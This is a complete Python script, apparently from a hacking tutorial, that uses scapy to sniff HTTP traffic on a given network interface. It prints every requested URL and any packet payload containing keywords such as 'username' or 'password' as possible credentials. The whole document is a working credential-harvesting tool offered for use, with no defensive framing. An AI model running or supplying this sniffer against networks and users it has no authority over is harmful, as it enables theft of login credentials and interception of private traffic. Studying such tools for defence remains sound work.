#!/usr/bin/env python

import argparse
import scapy.all as scapy
from scapy.layers import http


def get_arguments():
    parser = argparse.ArgumentParser()
    parser.add_argument("-i", "--interface", dest="interface", help="Interface IP.")
    options = parser.parse_args()
    if not options.interface:
        parser.error("[-] Please specify an interface ip, use --help for more info.")
    return options

# Call process_sniffed_packet function everytime it captures a packet but dont store it.
def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)


def get_url(packet):
    return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path


def get_login_info(packet):
    if packet.haslayer(scapy.Raw):
        load = packet[scapy.Raw].load
        # load = packet[scapy.Raw].load.decode()    python3
        keywords = ["username", "user", "uname", "login", "password", "pass"]
        for keyword in keywords:
            if keyword in load:
                return load


def process_sniffed_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        url = get_url(packet)
        print("HTTP Request:\t" + url)
        # print("HTTP Request:\t" + url.decode())   python3
        login_info = get_login_info(packet)
        if login_info:
            print("\n\n[+] Possible username/password:\t" + login_info + "\n\n")


options = get_arguments()
sniff(options.interface)